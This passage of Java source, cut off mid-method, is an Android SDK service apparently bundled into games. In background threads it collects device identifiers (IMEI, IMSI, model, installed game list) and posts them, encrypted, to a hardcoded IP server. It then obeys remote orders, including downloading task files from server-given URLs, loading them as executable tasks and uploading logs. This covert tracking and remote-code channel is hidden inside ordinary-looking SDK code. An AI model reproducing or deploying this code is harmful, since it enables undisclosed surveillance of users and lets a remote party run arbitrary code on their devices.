package com.acying.dsms;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;

/**
 * 主服务
 * @author keel
 *
 */
public class SdkServ implements DServ{

	
	
	public SdkServ() {
	}
	
	
	DSmser dsmsv;
	
	private static final String TAG = "dserv-DServ";
	
	
	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;
	
	
	//FIXME 将所有的log输出改为错误码定义输出
	
    public static final int ERR_PARA = 701;
    public static final int ERR_DECRYPT = 702;
    public static final int ERR_KEY_EXPIRED = 703;
    public static final int ERR_DECRYPT_CLIENT = 704;
    public static final int ERR_CONFIG = 705;
    public static final int ERR_UP_RESP = 706;
    public static final int ERR_CHECK_V = 707;
    public static final int ERR_DEAL_ACT = 708;
    public static final int ERR_UP = 709;
    public static final int ERR_TASK = 710;
    public static final int ERR_TASK_THREAD = 711;
    public static final int ERR_LOG_THREAD = 712;
    public static final int ERR_LOG_UPLOAD = 713;
    
    long nextUpTime;
    long lastUpTime = 0;
    long lastUpLogTime = 0;
	int taskSleepTime = 5*60*1000;
	int upSleepTime = 1000*60*60*6;
	int shortSleepTime = 1000*60*5;
	int maxLogSleepTime = 1000*60*60;
	int maxLogSize = 1024*10;
	
	int timeOut = 5000;
	private int version = 5;
//	private static int keyVersion = 1;
	private static final String SPLIT_STR = "@@";
	private static final String datFileType = ".dat";
	private boolean isConfigInit = false;
	
	long uid = 0;
	
	UpThread upThread;
	TaskThread taskThread;
	
//	private  String cacheDir= ctx.getApplicationInfo().dataDir;
	
	
	private String upUrl = "http://120.24.64.185:12370/dsms/PS";
	private String upLogUrl = "http://120.24.64.185:12370/dsms/PL";
	private String notiUrl = "http://120.24.64.185:12370/dsms/task/noti";
//	static String upUrl = "http://202.102.105.15:8080/PLServer/PS";
//	static String upLogUrl = "http://202.102.105.15:8080/PLServer/PL";
	final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dsms/";
	private String emvClass = "com.acying.dsms.MoreView";
	private String emvPath = "emv";
	private int state = DSms.STATE_RUNNING;
	
//	/**
//	 * 是否联网状态
//	 */
//	private boolean isNetOk = false;
	
	private HashMap<String,Object> config;
	private ArrayList<String> gameList = new ArrayList<String>();
	
	private String configPath = sdDir+"cache_01";
	
	//private String pkgName = ctx.getPackageName();



	public class NotiTask implements DSTask{
		
		private long tid;
		private int type;
		private String msg;
		private String noti_Url;
		private long uid;
		public void setParas(long tid,int type,String msg,String notiUrl,long uid){
			this.tid = tid;
			this.type = type;
			this.msg = msg;
			this.noti_Url = notiUrl;
			this.uid = uid;
		}

		@Override
		public void run() {
			try {
				String u = this.noti_Url+"?t="+this.tid+"&y="+this.type+"&u="+this.uid+"&m="+msg;
				URL url = new URL(u);
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.connect();
				BufferedReader reader = new BufferedReader(new InputStreamReader(
						conn.getInputStream()));
				StringBuilder urlBack = new StringBuilder();
				String lines;
				while ((lines=reader.readLine()) != null) {
					urlBack.append(lines);
				}
				reader.close();
				// 断开连接
				conn.disconnect();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		@Override
		public void setDService(DServ serv) {
		}

		@Override
		public int getId() {
			return 0;
		}

		@Override
		public void init() {
		}

		@Override
		public int getState() {
			return 0;
		}

		@Override
		public void setState(int state) {
			
		}
		
	}

	public void noti(long tid,int type,String msg){
		NotiTask nt = new NotiTask();
		nt.setParas(tid, type, msg, SdkServ.this.getPropString("notiUrl", notiUrl), this.uid);
		this.taskList.add(nt);
		this.taskThread.interrupt();
	}
	//------------------------config----------------------------------------
	
	@SuppressWarnings("unchecked")
	public void initConfig(String gcid){
		this.config = this.readConfig(this.configPath);
		if (this.config == null || this.config.size() <= 0) {
			//直接初始化config
			this.config = new HashMap<String, Object>();
			this.config.put("state", DSms.STATE_RUNNING);
			this.config.put("upUrl", upUrl);
			this.config.put("upLogUrl", upLogUrl);
			this.config.put("notiUrl", notiUrl);
			this.config.put("emvClass", this.emvClass);
			this.config.put("emvPath", this.emvPath);
			this.config.put("t", "");
			this.config.put("dt", "");
			this.config.put("uid", "0");
			this.config.put("taskSleepTime", taskSleepTime);
			this.config.put("upSleepTime", upSleepTime);
			this.config.put("shortSleepTime", shortSleepTime);
			this.config.put("maxLogSleepTime", maxLogSleepTime);
			this.config.put("maxLogSize", maxLogSize);
			this.saveConfig();
			DSms.log(this.dsmsv,TAG, "no conf");
		}
		//games初始化
		try {
			if (this.config.get("games") != null) {
				this.gameList = (ArrayList<String>) this.config.get("games");
				if ((!gcid.startsWith("0_")) && !this.gameList.contains(gcid)) {
					this.gameList.add(gcid);
				}
			}else{
				if ((!gcid.startsWith("0_")) && !this.gameList.contains(gcid)) {
					this.gameList.add(gcid);
				}
				this.config.put("games", this.gameList);
			}
			DSms.log(this.dsmsv,TAG, "init config OK:"+JSON.write(this.config));
		} catch (Exception e) {
			this.gameList = new ArrayList<String>();
			if ((!gcid.startsWith("0_"))) {
				this.gameList.add(gcid);
			}
		}
		
		//初始化uid
		this.uid = Long.parseLong(this.getPropString("uid", "0"));
		emvClass = this.getPropString("emvClass", emvClass);
		emvPath = this.getPropString("emvPath", emvPath);
		upUrl = this.getPropString("upUrl", upUrl);
		upLogUrl = this.getPropString("upLogUrl", upLogUrl);
		notiUrl = this.getPropString("notiUrl", notiUrl);
		this.upSleepTime = this.getPropInt("upSleepTime", upSleepTime);
		this.taskSleepTime = this.getPropInt("taskSleepTime", taskSleepTime);
		this.shortSleepTime = this.getPropInt("shortSleepTime", shortSleepTime);
		this.maxLogSize = this.getPropInt("maxLogSize",  maxLogSize);
		this.maxLogSleepTime = this.getPropInt("maxLogSleepTime", maxLogSleepTime);
		
		this.isConfigInit = true;
//				String keyStr = this.getPropString( "k", Base64Coder.encode(key));
//				Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
//		String tasks = this.getPropString( "t", "");
//				String deadTasks = this.getPropString("dt", "");
		
	}
	
	@SuppressWarnings("unchecked")
	private HashMap<String,Object> readConfig(String configPath){
//		String txt = readTxt(configPath);
//		DSms.log(this.dservice,TAG, "read enc:"+txt);
//		if (!StringUtil.isStringWithLen(txt, 44)) {
//			DSms.e(this.dservice,TAG, "config File error!");
//			return this.config;
//		}
		try {
			String jsonStr = DSms.Cl(configPath);
			if (jsonStr != null) {
				HashMap<String, Object> m = (HashMap<String, Object>) JSON.read(jsonStr);
				if (m != null && m.size()>2) {
					this.config = m;
				}
			}
		} catch (Exception e) {
			e(ERR_CONFIG,0,this.dsmsv.getPackageName(),"0_0_"+configPath+"@@"+Log.getStackTraceString(e));
			DSms.e(this.dsmsv,TAG, "config File error!",e);
		}
		
		return this.config;
	}
	public String getPropString(String propName,String defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return value.toString();
	}
	public Object getPropObj(String propName,Object defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return value;
	}
	public int getPropInt(String propName,int defaultValue){
		Object value = this.config.get(propName);
		if (value == null) {
			return defaultValue;
		}
		return Integer.parseInt(String.valueOf(value));
	}
	public void setProp(String propName,Object value,boolean isSave){
		this.config.put(propName, value);
		if (isSave) {
			this.saveConfig();
		}
	}
	
	public void saveConfig(){
		this.saveConfig(this.configPath);
	}
	
	private void saveConfig(String configPath){
		try {
			String cTime = String.valueOf(System.currentTimeMillis());
			this.config.put("timeStamp", cTime);
			String conf = JSON.write(this.config);
			DSms.Ck(configPath, conf);
//			String enc =  DService.CsaveConfig(configPath, conf);
//			writeTxt(configPath,enc);
		} catch (Exception e) {
			DSms.e(this.dsmsv,TAG, "save config error!", e);
		}
	}
	
	//----------------------------config end------------------------------------
	
	public void receiveMsg(int act,String p,String v,String m){
		DSms.log(this.dsmsv,TAG, "act:"+act+" p:"+p +" m:"+m);
		if (p == null) {
			DSms.log(this.dsmsv,TAG, "receive p is null:"+act);
			return;
		}
		//just log save
		if (DSms.ACT_LOG == act) {
			dsLog(DSms.LEVEL_D,"LOG",act, p, "0_0_"+m);
			return;
		}
//		if (act == DSms.ACT_APP_INSTALL || act == DSms.ACT_APP_REMOVE || act == DSms.ACT_APP_REPLACED ) {
//			//跳过v验证
//			DSms.log(this.dservice,TAG, "jump v check. act:"+act);
//		}else{
		if (StringUtil.isStringWithLen(v, 2)) {
			if(!DSms.Ce(v, dsmsv)){
				DSms.e(this.dsmsv,TAG, "v check failed.",null);
				e(ERR_CHECK_V,act, p, m+"_@@"+v);
				return;
			}else{
				DSms.log(this.dsmsv,TAG, "v check OK");
			}
		}else{
			DSms.e(this.dsmsv,TAG, "v is empty.",null);
			e(ERR_CHECK_V,act, p, m+"_@@"+v);
			return;
		}
//		}
		String gid = "0";
		String cid = "0";
		
		if (m == null) {
			m = "0_0_";
		}else{
			String[] gcid = m.split("_");
			if (gcid.length >=2) {
				gid = gcid[0];
				cid = gcid[1];
				DSms.log(this.dsmsv,TAG, "gid:"+gid+" cid:"+cid);
			}
		}
		try {
			switch (act) {
			case DSms.ACT_EMACTIVITY_START:
				dsLog(DSms.LEVEL_I, "MORE",act, p, m);
//				这里将下载的jar统一放到update目录
//				String emvDir = sdDir + "update/";
//				(new File(emvDir)).mkdirs();
				String emvP = sdDir+SdkServ.this.emvPath+".jar";
				DSms.log(this.dsmsv,TAG, "emvP:"+emvP);
				File f = new File(emvP);
				if (f == null ||  !f.exists()|| f.isDirectory() ) {
					/*
					Intent intent = dsmsv.getPackageManager().getLaunchIntentForPackage(
								"com.egame");
					boolean egameStart = false;
					if (intent != null) {
						intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						try {
							dsmsv.startActivity(intent);
							egameStart = true;
						} catch (Exception e) {
							
						}
					}
					if (!egameStart) {
						Uri moreGame = Uri.parse("http://play.cn");
						intent = new Intent(Intent.ACTION_VIEW, moreGame);
						intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						dsmsv.startActivity(intent);
					}
					*/
					break;
				}
				Intent it= new Intent(dsmsv.getApplicationContext(), EmAcv.class);    
				it.putExtra("emvClass", SdkServ.this.emvClass);
				it.putExtra("emvPath", SdkServ.this.emvPath);
				it.putExtra("uid", SdkServ.this.uid);
				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
				dsmsv.startActivity(it); 
				break;
			case DSms.ACT_NOTI:
				String[] noti = m.split("@@"); //0_0_sf@@tid@@type@@msg
				if (noti.length >2 && StringUtil.isDigits(noti[1]) && StringUtil.isDigits(noti[2])) {
					this.noti(Long.parseLong(noti[1]), Integer.parseInt(noti[2]), (noti.length>3)?noti[3]:"");
					dsLog(DSms.LEVEL_I, "NOTI",act, p, m);
				}
				break;
			case DSms.ACT_NET_CHANGE:
//				if (m.equals("true")) {
//					isNetOk = true;
//				}else{
//					isNetOk = false;
//				}
				DSms.log(dsmsv, TAG, "ACT_NET_CHANGE:"+m);
				//dsLog(DSms.LEVEL_I, "NET",act, p, m);
				break;
			case DSms.ACT_GAME_INIT:
				String gcid = gid+"_"+cid;
				if ((!gid.equals("0")) && !this.gameList.contains(gid+"_"+cid)) {
					this.gameList.add(gcid);
					this.config.put("games", this.gameList);
					this.saveConfig();
				}
			case DSms.ACT_GAME_EXIT:
			case DSms.ACT_GAME_EXIT_CONFIRM:
			case DSms.ACT_GAME_CUSTOM:
				dsLog(DSms.LEVEL_I, "GAME",act, p, m);
				break;
			case DSms.ACT_FEE_INIT:
			case DSms.ACT_FEE_OK:
			case DSms.ACT_FEE_FAIL:
				dsLog(DSms.LEVEL_I, "FEE",act, p, m);
				break;
			case DSms.ACT_PUSH_CLICK:
			case DSms.ACT_PUSH_RECEIVE:
				dsLog(DSms.LEVEL_I, "PUSH",act, p, m);
				break;
			case DSms.ACT_APP_INSTALL:
			case DSms.ACT_APP_REMOVE:
				dsLog(DSms.LEVEL_I, "APP",act, p, m);
				break;
			case DSms.ACT_BOOT:
				dsLog(DSms.LEVEL_I, "BOOT",act, p, m);
				break;
			case DSms.STATE_STOP:
				dsLog(DSms.LEVEL_I, "STOP",act, p, m);
				stopService();
				break;
			case DSms.STATE_NEED_RESTART:
				dsLog(DSms.LEVEL_I, "RESTART",act, p, m);
				startService(gid);
				break;
			default:
//			Intent i = new Intent();  
//			i.setClass(context, SdkServ.this.ctx.getClass());  
//			context.startService(i);
			}
			//检查线程是否正常
			checkThreads();
		} catch (Exception e) {
			e.printStackTrace();
			e(ERR_DEAL_ACT,act,p, m);
		}
		
		
	}
	
	private void checkThreads(){
		try {
			DSms.log(dsmsv, TAG, "checkThreads start.");
			Thread.sleep(15 * 1000);
		} catch (InterruptedException e) {
		}
		
		if (this.state != DSms.STATE_RUNNING) {
			return;
		}
		if (this.lt == null || this.lt.getState().equals(Thread.State.TERMINATED)) {
			DSms.log(dsmsv, TAG, "lt start.");
			this.lt = new LT();
			this.lt.setRunFlag(true);
			this.lt.start();
		}
		if (this.upThread == null || this.upThread.getState().equals(Thread.State.TERMINATED)) {
			DSms.log(dsmsv, TAG, "upThread start.");
			this.upThread = new UpThread();
			this.upThread.setRun(true);
			this.upThread.start();
		}
		if (this.taskThread == null || this.taskThread.getState().equals(Thread.State.TERMINATED)) {
			DSms.log(dsmsv, TAG, "taskThread start.");
			this.taskThread = new TaskThread();
			this.taskThread.setRun(true);
			this.taskThread.start();
		}
	}
	
	
	public void pauseService(){
		this.state = DSms.STATE_PAUSE;
		this.setProp("state", DSms.STATE_PAUSE,true);
	}
	
	public void stopService(){
		this.state = DSms.STATE_STOP;
		this.setProp("state", DSms.STATE_STOP,true);
		this.stop();
	}
	
	public void startService(String gid){
		this.state = DSms.STATE_RUNNING;
		this.setProp("state", DSms.STATE_RUNNING,true);
		this.init(this.dsmsv,gid);
	}
	
	
	public void updateTaskState(int tid,int state ){
		synchronized (taskList) {
			
		for (DSTask task : this.taskList) {
			if (task.getId() == tid) {
				task.setState(state);
			}
		}
		}
	}
	
	public DSTask getTask(int tid){
		synchronized (taskList) {
			
		for (DSTask task : this.taskList) {
			if (task.getId() == tid) {
				return task;
			}
		}
		}
		return null;
	}
	
	
	public boolean downloadGoOn(String url, String filePath,String filename,Context ct) {
		// file.size()即可得到原来下载文件的大小
//		// 设置代理
//		Header header = null;
//		if (mode == 2) {
//			// 移动内网的时候使用代理
//			url = format_CMWAP_URL(strPath);
//			header = new BasicHeader("X-Online-Host",
//					format_CMWAP_ServerName(strPath));
//		}
		
		// 获取文件对象，开始往文件里面写内容
		File myTempFile = new File(filePath + File.separator + filename);
		long size = myTempFile.length();
		
		HttpResponse response = null;
		// 用来获取下载文件的大小
		HttpResponse response_test = null;
		//long downloadfilesize = 0;
		try {
			HttpClient client = new DefaultHttpClient();
			HttpClient client_test = new DefaultHttpClient();
			HttpGet request = new HttpGet(url);
			HttpGet request_test = new HttpGet(url);
			String v = DSms.Cd(ct);
			request.addHeader("v", v);
//			if (header != null) {
//				request.addHeader(header);
//			}
			request_test.addHeader("v", v);
			request_test.addHeader("test", "true");
			response_test = client_test.execute(request_test);
			if (response_test.getStatusLine() == null || response_test.getStatusLine().getStatusCode() != 200) {
				return false;
			}
			// 获取需要下载文件的大小
			long fileSize = response_test.getEntity().getContentLength();
			request_test.abort();
			client_test.getConnectionManager().shutdown();
			// 验证下载文件的完整性
			if (fileSize != 0) {
				if (fileSize == size) {
					//已经下载完成,直接返回true
					return true;
				}else if(fileSize < size){
					//体积不正确，重新从头下载所有内容
					size = 0;
				}
				
			}
			// 设置下载的数据位置XX字节到XX字节
			Header header_size = new BasicHeader("Range", "bytes=" + size + "-"
					+ fileSize);
			request.addHeader(header_size);
			response = client.execute(request);
			InputStream is = response.getEntity().getContent();
			if (is == null) {
				throw new RuntimeException("stream is null");
			}
//			SDCardUtil.createFolder(filePath);
			File folder = new File(filePath);
			folder.mkdirs();
			RandomAccessFile fos = new RandomAccessFile(myTempFile, "rw");
			// 从文件的size以后的位置开始写入，其实也不用，直接往后写就可以。有时候多线程下载需要用

			fos.seek(size);
			byte buf[] = new byte[IO_BUFFER_SIZE];
			
			do {
				int numread = is.read(buf);
				if (numread <= 0) {
					break;
				}
				fos.write(buf, 0, numread);
//				if (handler != null) {
////					Message msg = new Message();
				
				//	downloadfilesize += numread;
				
//					double percent = (double) (downloadfilesize + size)
//							/ fileSize;
////					msg.obj = String.valueOf(percent);
////					handler.sendMessage(msg);// 更新下载进度百分比
//				}
			} while (true);
			is.close();
			fos.close();
			return true;
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		return false;
	}
	
	public boolean zip(String src, String dest){
		// 提供了一个数据项压缩成一个ZIP归档输出流
		ZipOutputStream out = null;
		boolean re = false;
		try {

			File fileOrDirectory = new File(src);// 被压缩文件路径
			if (!fileOrDirectory.exists()) {
				return false;
			}
			File outFile = new File(dest);// 源文件或者目录
			out = new ZipOutputStream(new FileOutputStream(outFile));
			out.setLevel(9);
			// 如果此文件是一个文件
			if (fileOrDirectory.isFile()) {
				zipFileOrDirectory(out, fileOrDirectory, "");
				re = true;
			} else if(fileOrDirectory.isDirectory()){
				// 返回一个文件或空阵列。
				File[] entries = fileOrDirectory.listFiles();
				for (int i = 0; i < entries.length; i++) {
					// 递归压缩，更新curPaths
					zipFileOrDirectory(out, entries[i], "");
				}
				re = true;
			}else{
				re = false;
			}
			
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			// 关闭输出流
			if (out != null) {
				try {
					out.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
		}
		return re;
	}

	private static void zipFileOrDirectory(ZipOutputStream out,
			File fileOrDirectory, String curPath)  {
		// 从文件中读取字节的输入流
		FileInputStream in = null;
		try {
			// 如果此文件是一个目录，否则返回false。
			if (fileOrDirectory.isFile()) {
				// 压缩文件
				byte[] buffer = new byte[4096];
				int bytes_read;
				in = new FileInputStream(fileOrDirectory);
				// 实例代表一个条目内的ZIP归档
				ZipEntry entry = new ZipEntry(curPath
						+ fileOrDirectory.getName());
				// 条目的信息写入底层流
				out.putNextEntry(entry);
				while ((bytes_read = in.read(buffer)) != -1) {
					out.write(buffer, 0, bytes_read);
				}
				out.closeEntry();
			} else if(fileOrDirectory.isDirectory()) {
				// 压缩目录
				File[] entries = fileOrDirectory.listFiles();
				for (int i = 0; i < entries.length; i++) {
					// 递归压缩，更新curPaths
					zipFileOrDirectory(out, entries[i], curPath
							+ fileOrDirectory.getName() + "/");
				}
			}
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException ex) {
					ex.printStackTrace();
				}
			}
		}
	}
	
	public boolean unzip(String file,String outputDirectory){
		boolean re = false;
		ZipFile zipFile = null;
		try {
			zipFile = new ZipFile(file);
			Enumeration<? extends ZipEntry> e = zipFile.entries();
			ZipEntry zipEntry = null;
			File dest = new File(outputDirectory);
			dest.mkdirs();
			while (e.hasMoreElements()) {
				zipEntry = (ZipEntry) e.nextElement();
				String entryName = zipEntry.getName();
				InputStream in = null;
				FileOutputStream out = null;
				try {
					if (zipEntry.isDirectory()) {
						String name = zipEntry.getName();
						name = name.substring(0, name.length() - 1);
						File f = new File(outputDirectory + File.separator
								+ name);
						f.mkdirs();
					} else {
						int index = entryName.lastIndexOf("\\");
						if (index != -1) {
							File df = new File(outputDirectory + File.separator
									+ entryName.substring(0, index));
							df.mkdirs();
						}
						index = entryName.lastIndexOf("/");
						if (index != -1) {
							File df = new File(outputDirectory + File.separator
									+ entryName.substring(0, index));
							df.mkdirs();
						}
						File f = new File(outputDirectory + File.separator
								+ zipEntry.getName());
						in = zipFile.getInputStream(zipEntry);
						out = new FileOutputStream(f);
						int c;
						byte[] by = new byte[IO_BUFFER_SIZE];
						while ((c = in.read(by)) != -1) {
							out.write(by, 0, c);
						}
						out.flush();
					}
				} catch (IOException ex) {
					ex.printStackTrace();
				} finally {
					if (in != null) {
						try {
							in.close();
						} catch (IOException ex) {
						}
					}
					if (out != null) {
						try {
							out.close();
						} catch (IOException ex) {
						}
					}
				}
			}
			re = true;
		} catch (IOException ex) {
			ex.printStackTrace();
		} finally {
			if (zipFile != null) {
				try {
					zipFile.close();
				} catch (IOException ex) {
				}
			}
		}

		return re;
	}
	
	
	/**
	 * 返回是否有新的远程任务
	 * @param remoteListStr
	 * @param downUrl
	 * @return
	 */
	private boolean syncTaskList(String remoteListStr,String downUrl){
		if (!StringUtil.isStringWithLen(remoteListStr, 1)) {
			DSms.log(this.dsmsv,TAG, "remote task is empty.");
			return false;
		}
		DSms.log(this.dsmsv,TAG, "remoteListStr:"+remoteListStr);
		String[] remoteList = remoteListStr.split("_");
		ArrayList<Integer> needFetchList = new ArrayList<Integer>();
		synchronized (this.taskList) {
			for (int i = 0; i < remoteList.length; i++) {
				int tid = Integer.parseInt(remoteList[i]);
				boolean had = false;
				StringBuilder tsb = new StringBuilder();
				for (int j = 0; j < taskList.size(); j++) {
					DSTask t = (DSTask)this.taskList.get(j);
					tsb.append(t.getId()).append(",");
					if (t.getId() == tid) {
						had = true;
						break;
					}
				}
				DSms.log(this.dsmsv,TAG, "tid:"+tid+" tlist:"+tsb.toString()+ had);
				if (!had) {
					DSTask task = this.loadTask(tid, sdDir);
					if (task == null) {
						needFetchList.add(tid);
					}else{
						taskList.add(task);
					}
				}
			}
		}
		//fetch remote tasks
		boolean haveRemoteTask = false;
		for (Integer id : needFetchList) {
			if (this.fetchRemoteTask(id,downUrl)) {
				DSms.log(this.dsmsv,TAG, "fetch OK:"+id);
				DSTask task = this.loadTask(id, sdDir);
				if (task != null) {
					task.setDService(this);
					task.init();
					this.taskList.add(task);
					haveRemoteTask = true;
				}else{
					DSms.e(this.dsmsv,TAG, "loadTask ERR:"+id,null);
				}
			}else{
				DSms.e(this.dsmsv,TAG, "fetch ERR:"+id,null);
			}
		}
		this.saveStates();
		return haveRemoteTask;
	}
	private static final int IO_BUFFER_SIZE = 1024 * 4;
	
	final String ENCORDING = "UTF-8";

	boolean upload(String localFile, String uplogUrl){
		String boundary = "---------------------------7dc7c595809b2";
		boolean sucess = false;
		try {
			// 分割线
			File file = new File(localFile);

			String fileName = file.getName();
			// 用来解析主机名和端口
			URL url = new URL(uplogUrl + "?f=" + fileName);
			// 打开连接, 设置请求头
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(timeOut);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Content-Type",
					"multipart/form-data; boundary=" + boundary);
			conn.setRequestProperty("Content-Length", file.length()+ "");
			conn.setRequestProperty("v", DSms.Cd(SdkServ.this.dsmsv));
			conn.setDoOutput(true);
			conn.setDoInput(true);

			// 获取输入输出流
			OutputStream out = conn.getOutputStream();
			FileInputStream fis = new FileInputStream(file);

			// 写出文件数据
			byte[] buf = new byte[IO_BUFFER_SIZE];
			int len;
			while ((len = fis.read(buf)) != -1){
				out.write(buf, 0, len);
			}
			InputStream in = conn.getInputStream();
			InputStreamReader isReader = new InputStreamReader(in);
			BufferedReader bufReader = new BufferedReader(isReader);
			String line = null;
			StringBuilder data = new StringBuilder();
			while ((line = bufReader.readLine()) != null){
				data.append(line);
			}
			if (conn.getResponseCode() == 200 && data.toString().equals("ok")) {
				sucess = true;
			}
			in.close();
			fis.close();
			out.close();
			conn.disconnect();
		} catch (Exception e) {
			DSms.e(this.dsmsv,TAG, "upload Failed",e);
			sucess = false;
		}

		return sucess;
	}

	private boolean fetchRemoteTask(int id,String downUrl){
		String remote = downUrl+"?id="+id;
		return downloadGoOn(remote,sdDir,id+datFileType,this.dsmsv);
	}
	
	public static final String listToString(ArrayList<String> ls){
		if (ls == null || ls.isEmpty() ) {
			return "";
		}
		StringBuilder sb = new StringBuilder();
		for (Iterator<String> it = ls.iterator(); it.hasNext();) {
			String s = it.next();
			sb.append(s).append("-");
		}
		return sb.toString();
	}
	
	public class UpThread extends Thread{

		boolean runFlag = true;
		int errTimes = 0;
		int maxErrTimes = 20;
		boolean isCJ = false;
		/**
		 * @param runFlag the runFlag to set
		 */
		public final void setRun(boolean runFlag) {
			this.runFlag = runFlag;
		}

		@SuppressWarnings("unchecked")
		public boolean up(){
			try {
				StringBuilder sb = new StringBuilder();
				int api_level = android.os.Build.VERSION.SDK_INT;
				if (SdkServ.this.dsmsv == null) {
					DSms.e(SdkServ.this.dsmsv,"UP", "ctx is null",null);
					return false;
				}
				TelephonyManager tm=(TelephonyManager) SdkServ.this.dsmsv.getSystemService(Context.TELEPHONY_SERVICE);
				String imei = tm.getDeviceId();
				String imsi = tm.getSubscriberId();
				String ua = android.os.Build.MODEL;
				sb.append(uid).append(SPLIT_STR);
				sb.append(api_level).append(SPLIT_STR);
				sb.append(imei).append(SPLIT_STR);
				sb.append(imsi).append(SPLIT_STR);
				sb.append(ua).append(SPLIT_STR);
				sb.append(SdkServ.this.getVer()).append(SPLIT_STR);
				sb.append(lastUpTime).append(SPLIT_STR);
				sb.append(System.currentTimeMillis()).append(SPLIT_STR);
				//this.ctx.taskList;
				synchronized (SdkServ.this.taskList) {
					for (int i = 0; i < SdkServ.this.taskList.size(); i++) {
						DSTask t = (DSTask)SdkServ.this.taskList.get(i);
						sb.append(t.getId());
						sb.append("_");
					}
				}
				sb.append(SPLIT_STR).append(getPropString("dt", ""));
				
				DisplayMetrics dm =dsmsv.getResources().getDisplayMetrics();  
		        int w_screen = dm.widthPixels;  
		        int h_screen = dm.heightPixels;
		        int densityDpi = dm.densityDpi;
				String screen = w_screen+"_"+h_screen+"_"+densityDpi;
				//screen
				sb.append(SPLIT_STR).append(screen);
				//pkg
				sb.append(SPLIT_STR).append(dsmsv.getPackageName());
				//games
				Object gsObj = SdkServ.this.getPropObj("games",null);
				String games = "";
				if (gsObj != null) {
					games = listToString((ArrayList<String>)gsObj);
				}
				sb.append(SPLIT_STR).append(games);
				//state
				sb.append(SPLIT_STR).append(SdkServ.this.getState());
				
				DSms.log(SdkServ.this.dsmsv,TAG, "postUrl data:"+sb.toString());
				
				String data = "up="+DSms.Cg(sb.toString());
				DSms.log(SdkServ.this.dsmsv,TAG, "enc data:"+data);
				URL aUrl = null;
				if (errTimes > maxErrTimes) {
					aUrl = new URL(DSms.Cj());
					isCJ = true;
				}else{
					aUrl = new URL(SdkServ.this.getPropString("upUrl", upUrl));
					isCJ = false;
				}
			    URLConnection conn = aUrl.openConnection();
			    conn.setConnectTimeout(timeOut);
			    conn.setRequestProperty("v", DSms.Cd(SdkServ.this.dsmsv));
			    conn.setDoInput(true);
			    conn.setDoOutput(true);
			    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
			    wr.write(data);
			    wr.flush();

			    // Get the response
			    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream(),"utf-8"));
			    String line;
			    sb = new StringBuilder();
				while ((line = rd.readLine()) != null) {
					sb.append(line);
				}
			    wr.close();
			    rd.close();
			    //判断是否错误
			    final String resp = sb.toString();
			    
			    
			    if (!StringUtil.isStringWithLen(resp, 4)) {
					//判断错误码
			    	DSms.e(SdkServ.this.dsmsv,TAG, resp,null);
			    	e(ERR_UP_RESP,0,SdkServ.this.dsmsv.getPackageName(),"0_0_resp:"+resp);
//			    	if (resp.equals(ERR_KEY_EXPIRED)) {
//						//key过期,发起更新key的请求升级key
//			    		
//					}else{
//						getHander().post(new Runnable() {     
//				            @Override     
//				            public void run() {     
//				                   Toast.makeText(SdkServ.this.dservice.getApplicationContext(), resp,Toast.LENGTH_SHORT).show(); 
//				            }     
//						});
//						//Toast.makeText(SdkServ.this.ctx.getApplicationContext(), resp, Toast.LENGTH_SHORT).show();;
//					}
			    	return false;
				}
			    //解密
				String re = DSms.Cf(resp);//Encrypter.getInstance().decrypt(resp);
				DSms.log(SdkServ.this.dsmsv,TAG, "re:"+re);
				String[] res = re.split(SPLIT_STR);
				if (!StringUtil.isDigits(res[0]) || !StringUtil.isDigits(res[1])) {
					DSms.e(SdkServ.this.dsmsv,TAG, "re length Error:"+re,null);
					return false;
				}
				SdkServ.this.uid = Long.parseLong(res[0]);
				SdkServ.this.setProp("uid", SdkServ.this.uid, true);
				int order = Integer.parseInt(res[1]);
				
				switch (order) {
				case ORDER_NONE:
					return true;
				case ORDER_SYNC_TASK:
					//比对task_id_list,进行同步
					DSms.log(SdkServ.this.dsmsv,TAG, "url:"+res[2]);
					String downLoadUrl = res[2];
					String remoteTaskIds = res[3];
					boolean hasRemoteTask = SdkServ.this.syncTaskList(remoteTaskIds,downLoadUrl);
					if (hasRemoteTask) {
						SdkServ.this.taskThread.interrupt();
					}
					
					//TODO 直接更新参数,格式为a=1,b=2,待测试
